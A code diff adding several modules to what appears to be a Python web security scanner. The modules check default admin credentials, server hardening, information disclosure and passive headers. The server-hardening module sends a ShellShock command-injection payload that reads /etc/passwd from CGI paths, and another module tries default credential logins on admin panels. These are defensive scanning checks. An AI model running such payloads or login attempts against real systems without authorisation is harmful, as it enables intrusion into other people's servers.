+            for payload, user, passwd in creds:
+                try:
+                    if method == "JSON":
+                        r = _sess.post(
+                            target_url,
+                            data=payload,
+                            headers={"Content-Type": "application/json",
+                                     "User-Agent": UA},
+                            timeout=TIMEOUT,
+                            allow_redirects=True,
+                        )
+                    elif method == "JENKINS":
+                        # Jenkins: probe path is /login but POST target is the action URL
+                        jenkins_post = base + "/j_spring_security_check"
+                        r = _sess.post(
+                            jenkins_post,
+                            data=payload,
+                            headers={"Content-Type": "application/x-www-form-urlencoded",
+                                     "User-Agent": UA,
+                                     "Referer": base + "/login"},
+                            timeout=TIMEOUT,
+                            allow_redirects=True,
+                        )
+                    else:
+                        r = _sess.post(
+                            target_url,
+                            data=payload,
+                            headers={"Content-Type": "application/x-www-form-urlencoded",
+                                     "User-Agent": UA},
+                            timeout=TIMEOUT,
+                            allow_redirects=True,
+                        )
+                    # Success = we landed on a dashboard indicator
+                    if any(ind.lower() in r.text.lower() for ind in indicators):
+                        # Also confirm it's not the login page itself
+                        if "invalid" not in r.text.lower() and "incorrect" not in r.text.lower():
+                            vuln(f"{app_name} default credentials valid: {user}:{passwd} at {path}", "Critical")
+                            add("default_creds", {
+                                "severity": "Critical",
+                                "title": f"{app_name} Default Credentials Work ({user}:{passwd})",
+                                "description": f"Login at {target_url} accepted default credentials {user}:{passwd} and returned admin dashboard indicators.",
+                                "recommendation": "Immediately change default credentials. Enable account lockout. Restrict admin paths by IP address.",
+                                "url": target_url,
+                            })
+                            found_any = True
+                            break
+                except Exception:
+                    pass
+
+    if not found_any:
+        good("No default credentials accepted on common admin panels")
+    _module_done("default_creds")
+
+
+# ═══ MODULE 55 — SERVER HARDENING & CGI SCAN ════════════════════
+def server_hardening_scan(url):
+    if _module_skip("srv_hardening"): info("Skipping Server Hardening (already done)"); return
+    section("MODULE 55 — SERVER HARDENING & CGI SCAN","🔩")
+
+    parsed = urlparse(url)
+    base = f"{parsed.scheme}://{parsed.netloc}"
+
+    # 1. WebDAV detection
+    try:
+        r_opt = _sess.request("OPTIONS", url, timeout=TIMEOUT,
+                              headers={"User-Agent": UA})
+        allow = r_opt.headers.get("Allow","") + r_opt.headers.get("DAV","")
+        if "PROPFIND" in allow or "DAV" in allow or r_opt.headers.get("DAV"):
+            vuln("WebDAV enabled — file operations may be possible", "High")
+            add("srv_hardening", {
+                "severity": "High",
+                "title": "WebDAV Enabled",
+                "description": "WebDAV is enabled on this server. Attackers may browse the directory structure, upload files, or overwrite existing files.",
+                "recommendation": "Disable WebDAV unless explicitly required. Restrict with IP-based ACL if needed.",
+                "url": url,
+            })
+        # PUT method check
+        if "PUT" in allow:
+            vuln("HTTP PUT method enabled — arbitrary file upload possible", "Critical")
+            add("srv_hardening", {
+                "severity": "Critical",
+                "title": "HTTP PUT Method Enabled",
+                "description": "The server allows HTTP PUT requests which may allow attackers to upload arbitrary files including web shells.",
+                "recommendation": "Disable PUT method in web server configuration unless required by application logic.",
+                "url": url,
+            })
+    except Exception: pass
+
+    # 2. PHP info pages
+    PHP_INFO_PATHS = [
+        "/phpinfo.php", "/info.php", "/test.php", "/php_info.php",
+        "/phptest.php", "/_info.php", "/phps.php",
+    ]
+    for path in PHP_INFO_PATHS:
+        try:
+            r = rget(base + path, timeout=TIMEOUT)
+            if r.status_code == 200 and "phpinfo()" in r.text and "PHP Version" in r.text:
+                vuln(f"PHP info page exposed: {path}", "High")
+                add("srv_hardening", {
+                    "severity": "High",
+                    "title": f"PHP Info Page Exposed ({path})",
+                    "description": f"phpinfo() at {base + path} reveals PHP version, loaded modules, configuration, file paths, and environment variables.",
+                    "recommendation": "Remove phpinfo() files from production servers immediately.",
+                    "url": base + path,
+                })
+                break
+        except Exception: pass
+
+    # 3. Apache server-status / server-info
+    for path, label in [("/server-status", "Apache server-status"), ("/server-info", "Apache server-info")]:
+        try:
+            r = rget(base + path, timeout=TIMEOUT)
+            if r.status_code == 200:
+                indicators = ["Apache Server Status", "Server Version", "Total Accesses", "Server Information"]
+                if any(ind in r.text for ind in indicators):
+                    vuln(f"{label} exposed at {path}", "Medium")
+                    add("srv_hardening", {
+                        "severity": "Medium",
+                        "title": f"{label} Exposed",
+                        "description": f"{label} page at {base + path} reveals real-time request stats, worker status, server version, and loaded modules.",
+                        "recommendation": f"Restrict access to {path} by IP or disable it entirely via Apache configuration.",
+                        "url": base + path,
+                    })
+        except Exception: pass
+
+    # 4. CGI ShellShock
+    SHELLSHOCK_PATHS = [
+        "/cgi-bin/test.cgi", "/cgi-bin/test-cgi", "/cgi-bin/status",
+        "/cgi-bin/printenv", "/cgi-bin/environment.cgi",
+    ]
+    SS_HEADER = {"User-Agent": "() { :;}; echo; echo; /bin/cat /etc/passwd",
+                 "Referer": "() { :;}; echo; echo; /bin/cat /etc/passwd"}
+    for path in SHELLSHOCK_PATHS:
+        try:
+            r = _sess.get(base + path, headers=SS_HEADER, timeout=TIMEOUT)
+            if r.status_code == 200 and ("root:x:" in r.text or "root:0:" in r.text):
+                vuln(f"ShellShock (CVE-2014-6271) confirmed at {path}!", "Critical")
+                add("srv_hardening", {
+                    "severity": "Critical",
+                    "title": "ShellShock CGI Vulnerability (CVE-2014-6271)",
+                    "description": f"The CGI script at {base + path} is vulnerable to ShellShock. Remote code execution is confirmed via /bin/cat /etc/passwd output.",
+                    "recommendation": "Update bash to a patched version immediately. Disable vulnerable CGI scripts. Apply server patches.",
+                    "url": base + path,
+                })
+                break
+            elif r.status_code == 200 and "cgi" in r.text.lower():
+                warn(f"CGI script exists at {path} — ShellShock check inconclusive")
+        except Exception: pass
+
+    # 5. Backup file deep scan
+    BACKUP_EXTS = [".bak", ".old", ".orig", ".save", ".swp", ".tmp", "~", ".backup",
+                   ".copy", ".dist", ".1", ".2"]
+    # Try common filenames with backup extensions
+    COMMON_FILES = ["index", "config", "configuration", "settings", "database",
+                    "db", "admin", "login", "setup", "install", "web", "app"]
+    _found_backup = threading.Event()
+
+    def _check_backup(fname, ext):
+        if _found_backup.is_set(): return
+        bpath = f"/{fname}{ext}"
+        try:
+            r = rget(base + bpath, timeout=5)
+            if r.status_code == 200 and len(r.content) > 50:
+                # Quick check that it's not just a 200 for everything
+                r404 = rget(base + "/thisfiledoesnotexist_xyz123.bak", timeout=4)
+                if r404.status_code == 200:
+                    return  # soft 404
+                _found_backup.set()
+                vuln(f"Backup file accessible: {bpath}", "High")
+                add("srv_hardening", {
+                    "severity": "High",
+                    "title": f"Backup File Exposed ({bpath})",
+                    "description": f"A backup copy of a source file is publicly accessible at {base + bpath}. This may contain database credentials, API keys, or application logic.",
+                    "recommendation": "Remove all backup files from web-accessible directories. Configure web server to deny access to backup extensions.",
+                    "url": base + bpath,
+                })
+        except Exception: pass
+
+    tasks = [(f, e) for f in COMMON_FILES for e in BACKUP_EXTS]
+    with ThreadPoolExecutor(max_workers=15) as ex:
+        futs = [ex.submit(_check_backup, f, e) for f, e in tasks]
+        for ft in as_completed(futs): _pass(ft)
+
+    # 6. IIS short filename (tilde) enumeration
+    try:
+        r_tilde = rget(base + "/a~1/a.aspx", timeout=min(TIMEOUT, 5))
+        r_normal = rget(base + "/abcdefghijklmnop.aspx", timeout=min(TIMEOUT, 5))
+        if r_tilde.status_code == 400 and r_normal.status_code == 404:
+            warn("IIS short filename enumeration (tilde ~) may be possible")
+            add("srv_hardening", {
+                "severity": "Low",
+                "title": "IIS Short Filename Enumeration (Tilde ~)",
+                "description": "IIS may be vulnerable to 8.3 filename enumeration via the tilde (~) character, allowing attackers to discover hidden files and directories.",
+                "recommendation": "Disable 8.3 filename generation on NTFS volumes: 'fsutil behavior set disable8dot3 1'. Apply IIS patches.",
+                "url": base + "/a~1/",
+            })
+    except Exception: pass
+
+    good("Server hardening scan complete")
+    _module_done("srv_hardening")
+
+
+# ═══ MODULE 56 — INFORMATION DISCLOSURE ═════════════════════════
+def info_disclosure_scan(url):
+    if _module_skip("info_disclosure"): info("Skipping Info Disclosure (already done)"); return
+    section("MODULE 56 — INFORMATION DISCLOSURE","📰")
+
+    # Patterns for private IPs
+    PRIVATE_IP_RE = re.compile(
+        r'\b(10\.\d{1,3}\.\d{1,3}\.\d{1,3}'
+        r'|172\.(1[6-9]|2\d|3[01])\.\d{1,3}\.\d{1,3}'
+        r'|192\.168\.\d{1,3}\.\d{1,3}'
+        r'|127\.\d{1,3}\.\d{1,3}\.\d{1,3})\b'
+    )
+
+    # Stack trace / debug patterns
+    STACK_PATTERNS = [
+        (r'Traceback \(most recent call last\)',              "Python stack trace"),
+        (r'File ".*\.py", line \d+',                         "Python file path disclosure"),
+        (r'at [\w\.]+\([\w\.]+\.java:\d+\)',                 "Java stack trace"),
+        (r'in [\w/\\]+\.php on line \d+',                    "PHP error with file path"),
+        (r'ErrorException.*app[/\\]',                        "Laravel/PHP exception"),
+        (r'ActiveRecord::',                                   "Ruby on Rails error"),
+        (r'Django.*Traceback',                                "Django debug page"),
+        (r'Microsoft.*OLE DB.*error',                        "MSSQL OLE DB error"),
+        (r'ORA-\d{5}:',                                      "Oracle DB error"),
+        (r'PostgreSQL.*ERROR',                               "PostgreSQL error"),
+        (r'mysql_fetch_array\(\)',                           "MySQL function exposure"),
+        (r'You have an error in your SQL syntax',            "MySQL SQL error"),
+        (r'SQLSTATE\[\w+\]',                                 "PDO SQL error"),
+        (r'Microsoft VBScript runtime error',                "VBScript runtime error"),
+        (r'System\.Web\.HttpUnhandledException',             "ASP.NET unhandled exception"),
+    ]
+
+    # Debug mode indicators
+    DEBUG_PATTERNS = [
+        (r'APP_DEBUG\s*=\s*true',                "Laravel debug mode on"),
+        (r'DEBUG\s*=\s*True',                    "Django debug mode on"),
+        (r'display_errors\s*=\s*On',             "PHP display_errors On"),
+        (r'"debug"\s*:\s*true',                  "JSON debug flag"),
+        (r'X-Debug-Token',                       "Symfony debug toolbar"),
+        (r'Whoops!.*pretty error handler',       "Whoops! debug handler"),
+    ]
+
+    # HTML comment sensitive patterns
+    COMMENT_PATTERNS = [
+        (r'<!--.*password.*-->',    "Password in HTML comment"),
+        (r'<!--.*passwd.*-->',      "Password in HTML comment"),
+        (r'<!--.*secret.*-->',      "Secret in HTML comment"),
+        (r'<!--.*api.?key.*-->',    "API key in HTML comment"),
+        (r'<!--.*token.*-->',       "Token in HTML comment"),
+        (r'<!--.*TODO.*-->',        "TODO comment exposed"),
+        (r'<!--.*FIXME.*-->',       "FIXME comment exposed"),
+        (r'<!--.*admin.*-->',       "Admin note in HTML comment"),
+    ]
+
+    # PII patterns
+    PII_PATTERNS = [
+        (r'\b4[0-9]{12}(?:[0-9]{3})?\b',               "Visa card number"),
+        (r'\b5[1-5][0-9]{14}\b',                        "MasterCard number"),
+        (r'\b3[47][0-9]{13}\b',                         "Amex card number"),
+        (r'\b\d{3}-\d{2}-\d{4}\b',                     "SSN pattern (US)"),
+    ]
+
+    try:
+        r = rget(url, timeout=TIMEOUT)
+        body = r.text
+        headers_str = str(r.headers)
+
+        # 1. Private IP in response
+        priv_ips = set(PRIVATE_IP_RE.findall(body + headers_str))
+        # Filter common false positives:
+        # 127.x in body is often a localhost reference in docs/config examples — keep only if in headers
+        priv_ips_body    = {ip for ip in PRIVATE_IP_RE.findall(body)         if not ip.startswith("127.")}
+        priv_ips_headers = set(PRIVATE_IP_RE.findall(headers_str))   # all including 127.x in headers
+        priv_ips = priv_ips_body | priv_ips_headers
+        if priv_ips:
+            for ip in priv_ips:
+                warn(f"Private IP disclosed: {ip}")
+            add("info_disclosure", {
+                "severity": "Medium",
+                "title": f"Private IP Address Disclosed ({', '.join(priv_ips)})",
+                "description": f"Internal IP address(es) {', '.join(priv_ips)} found in HTTP response. Reveals internal network topology.",
+                "recommendation": "Configure web server and application to strip internal IP addresses from responses and headers.",
+                "url": url,
+            })
+
+        # 2. Stack traces
+        for pattern, label in STACK_PATTERNS:
+            if re.search(pattern, body, re.I):
+                vuln(f"Stack trace / error disclosure: {label}", "Medium")
+                add("info_disclosure", {
+                    "severity": "Medium",
+                    "title": f"Stack Trace Disclosed — {label}",
+                    "description": f"The application returns detailed error information ({label}) in HTTP responses. Attackers gain file paths, line numbers, and technology stack details.",
+                    "recommendation": "Disable debug mode in production. Configure custom error pages. Catch exceptions gracefully.",
+                    "url": url,
+                })
+                break   # one finding per page
+
+        # 3. Debug mode
+        for pattern, label in DEBUG_PATTERNS:
+            if re.search(pattern, body, re.I):
+                vuln(f"Debug mode active: {label}", "High")
+                add("info_disclosure", {
+                    "severity": "High",
+                    "title": f"Debug Mode Enabled — {label}",
+                    "description": f"Debug mode indicator found: '{label}'. Debug mode exposes full stack traces, environment variables, and application internals to end users.",
+                    "recommendation": "Set DEBUG=False / APP_DEBUG=false / display_errors=Off in production configuration.",
+                    "url": url,
+                })
+                break
+
+        # 4. HTML comments with sensitive content
+        for pattern, label in COMMENT_PATTERNS:
+            match = re.search(pattern, body, re.I)
+            if match:
+                snippet = match.group(0)[:100]
+                warn(f"Sensitive HTML comment: {label}")
+                add("info_disclosure", {
+                    "severity": "Low",
+                    "title": f"Sensitive Data in HTML Comment — {label}",
+                    "description": f"An HTML comment contains potentially sensitive information: '{snippet}'",
+                    "recommendation": "Remove all sensitive comments from production HTML. Use server-side templating to avoid exposing internal notes.",
+                    "url": url,
+                })
+
+        # 5. PII patterns
+        for pattern, label in PII_PATTERNS:
+            if re.search(pattern, body):
+                vuln(f"PII pattern detected: {label}", "High")
+                add("info_disclosure", {
+                    "severity": "High",
+                    "title": f"Potential PII in Response — {label}",
+                    "description": f"Response body contains a pattern matching {label}. If real, this constitutes a data breach under GDPR and PCI DSS.",
+                    "recommendation": "Mask or truncate sensitive data before rendering in responses. Conduct full data flow audit.",
+                    "url": url,
+                })
+
+        # 6. Server header version disclosure
+        server_hdr = r.headers.get("Server","")
+        x_powered = r.headers.get("X-Powered-By","")
+        for hdr_val, hdr_name in [(server_hdr, "Server"), (x_powered, "X-Powered-By")]:
+            if hdr_val and re.search(r'\d+\.\d+', hdr_val):
+                info(f"Version in {hdr_name} header: {hdr_val}")
+                add("info_disclosure", {
+                    "severity": "Low",
+                    "title": f"Software Version Disclosed in {hdr_name} Header",
+                    "description": f"{hdr_name}: {hdr_val} — Exact version aids attackers in finding known CVEs for this software.",
+                    "recommendation": f"Remove or genericize the {hdr_name} header in web server configuration.",
+                    "url": url,
+                })
+
+    except Exception as e:
+        info(f"Info disclosure scan error: {e}")
+
+    good("Information disclosure scan complete")
+    _module_done("info_disclosure")
+
+
+# ═══ MODULE 57 — ZAP-STYLE PASSIVE ANALYSIS ══════════════════════
+def zap_passive_scan(url):
+    if _module_skip("zap_passive"): info("Skipping ZAP Passive (already done)"); return
+    section("MODULE 57 — ZAP-STYLE PASSIVE ANALYSIS","🔬")
+
+    parsed = urlparse(url)
+    base = f"{parsed.scheme}://{parsed.netloc}"
+    is_https = parsed.scheme == "https"
+
+    try:
+        r = rget(url, timeout=TIMEOUT)
+        body = r.text
+        hdrs = r.headers
+
+        # 1. Mixed content — HTTPS page loading HTTP resources
+        if is_https:
+            http_resources = re.findall(
+                r'(?:src|href|action|data-src)\s*=\s*["\']http://([^"\']+)["\']', body, re.I)
+            if http_resources:
+                warn(f"Mixed content detected — {len(http_resources)} HTTP resource(s) on HTTPS page")
+                add("zap_passive", {
+                    "severity": "Medium",
+                    "title": f"Mixed Content — HTTP Resources on HTTPS Page ({len(http_resources)} item(s))",
+                    "description": f"HTTPS page loads {len(http_resources)} resource(s) over insecure HTTP: {http_resources[0]}... Browsers block mixed content; attackers can intercept HTTP resources.",
+                    "recommendation": "Replace all HTTP resource URLs with HTTPS equivalents. Use Content-Security-Policy to enforce HTTPS-only resource loading.",
+                    "url": url,
+                })
+
+        # 2. Insecure form action (HTTP form on HTTPS page)
+        if is_https:
+            http_forms = re.findall(r'<form[^>]+action\s*=\s*["\']http://[^"\']+["\']', body, re.I)
+            if http_forms:
+                vuln(f"Insecure form action: form posts to HTTP from HTTPS page", "High")
+                add("zap_passive", {
+                    "severity": "High",
+                    "title": "Insecure Form Action — Form Posts Over HTTP",
+                    "description": "An HTTPS page contains a form with an HTTP action URL. User input (including passwords) is submitted unencrypted.",
+                    "recommendation": "Change all form action URLs to use HTTPS.",
+                    "url": url,
+                })
+
+        # 3. Autocomplete on password fields
+        if re.search(r'<input[^>]+type\s*=\s*["\']password["\'][^>]+>', body, re.I):
+            # Check if autocomplete=off is NOT set
+            pwd_fields = re.findall(r'<input[^>]+type\s*=\s*["\']password["\'][^>]+>', body, re.I)
+            for field in pwd_fields:
+                if "autocomplete" not in field.lower():
+                    warn("Password field missing autocomplete='off'")
+                    add("zap_passive", {
+                        "severity": "Low",
+                        "title": "Password Field Without autocomplete='off'",
+                        "description": "Password input field does not set autocomplete='off'. Browsers may cache the password, exposing it on shared/public devices.",
+                        "recommendation": "Add autocomplete='off' or autocomplete='new-password' to all password input fields.",
+                        "url": url,
+                    })
+                    break
+
+        # 4. Cache headers on potentially authenticated pages
+        cache_ctrl = hdrs.get("Cache-Control","")
+        pragma = hdrs.get("Pragma","")
+        # URL-based check uses specific path segments; body check uses more specific phrases
+        URL_AUTH_PATHS  = ["logout", "dashboard", "my-account", "admin", "profile"]
+        BODY_AUTH_SIGNS = ["logout", "sign out", "my account", "my dashboard",
+                           "welcome back", "account settings", "you are logged in"]
+        page_has_auth = (
+            any(ind in url.lower() for ind in URL_AUTH_PATHS) or
+            any(ind in body[:3000].lower() for ind in BODY_AUTH_SIGNS)
+        )
+        if page_has_auth:
+            if "no-store" not in cache_ctrl.lower() and "no-cache" not in cache_ctrl.lower():
+                warn("Authenticated/sensitive page may be cached by browser/proxy")
+                add("zap_passive", {
+                    "severity": "Medium",
+                    "title": "Sensitive Page May Be Browser-Cached",
+                    "description": f"Page at {url} appears to contain user-specific or authenticated content but Cache-Control header does not include no-store/no-cache. Shared browsers may expose session data.",
+                    "recommendation": "Set 'Cache-Control: no-store, no-cache, must-revalidate' and 'Pragma: no-cache' on all authenticated/sensitive pages.",
+                    "url": url,
+                })
+
+        # 5. robots.txt sensitive paths
+        try:
+            r_robots = rget(base + "/robots.txt", timeout=min(TIMEOUT, 5))
+            if r_robots.status_code == 200:
+                SENSITIVE_ROBOT_PATHS = [
+                    "/admin", "/administrator", "/backup", "/config", "/database",
+                    "/db", "/private", "/secret", "/logs", "/staging", "/dev",
+                    "/api", "/internal", "/uploads", "/files",
+                ]
+                disallowed = re.findall(r'(?:Disallow|Allow):\s*(/[^\s]+)', r_robots.text, re.I)
+                sensitive_exposed = [p for p in disallowed
+                                     if any(s in p.lower() for s in SENSITIVE_ROBOT_PATHS)]
+                if sensitive_exposed:
+                    warn(f"robots.txt reveals sensitive paths: {sensitive_exposed[:5]}")
+                    add("zap_passive", {
+                        "severity": "Low",
+                        "title": f"robots.txt Reveals Sensitive Paths ({len(sensitive_exposed)} path(s))",
+                        "description": f"robots.txt contains entries for potentially sensitive paths: {', '.join(sensitive_exposed[:5])}. While robots.txt aims to hide these from search engines, it simultaneously advertises them to attackers.",
+                        "recommendation": "Remove sensitive paths from robots.txt. Use authentication to protect sensitive paths rather than relying on robots.txt exclusion.",
+                        "url": base + "/robots.txt",
+                    })
+        except Exception: pass
+
+        # 6. Referrer-Policy header
+        if "Referrer-Policy" not in hdrs and "referrer-policy" not in {k.lower() for k in hdrs}:
+            info("Referrer-Policy header missing")
+            add("zap_passive", {
+                "severity": "Low",
+                "title": "Referrer-Policy Header Missing",
+                "description": "Without a Referrer-Policy header, browsers may send full URL (including sensitive query parameters) as Referer to third-party sites linked from this page.",
+                "recommendation": "Add: 'Referrer-Policy: strict-origin-when-cross-origin'",
+                "url": url,
+            })
+
+        # 7. Permissions-Policy header (formerly Feature-Policy)
+        if "Permissions-Policy" not in hdrs and "permissions-policy" not in {k.lower() for k in hdrs}:
+            info("Permissions-Policy header missing")
+            add("zap_passive", {
+                "severity": "Low",
+                "title": "Permissions-Policy Header Missing",
+                "description": "Without Permissions-Policy, any embedded third-party script can access camera, microphone, geolocation, and other browser APIs.",
+                "recommendation": "Add: 'Permissions-Policy: camera=(), microphone=(), geolocation=(), payment=()'",
+                "url": url,
+            })
+
+        # 8. Verbose response size anomaly (potential data dump)
+        content_len = len(body)
+        if content_len > 500_000:   # > 500KB response
+            warn(f"Unusually large response: {content_len // 1024}KB — possible data dump")
+            add("zap_passive", {
+                "severity": "Low",
+                "title": f"Unusually Large HTTP Response ({content_len // 1024} KB)",
+                "description": f"The server returned a {content_len // 1024}KB response which may indicate excessive data exposure, debug output, or a data dump.",
+                "recommendation": "Review this endpoint for unintended data disclosure. Paginate large datasets. Restrict debug output in production.",
+                "url": url,
+            })
+
+    except Exception as e:
+        info(f"ZAP passive scan error: {e}")
+
+    good("ZAP-style passive analysis complete")
+    _module_done("zap_passive")
 
 
 if __name__ == "__main__":
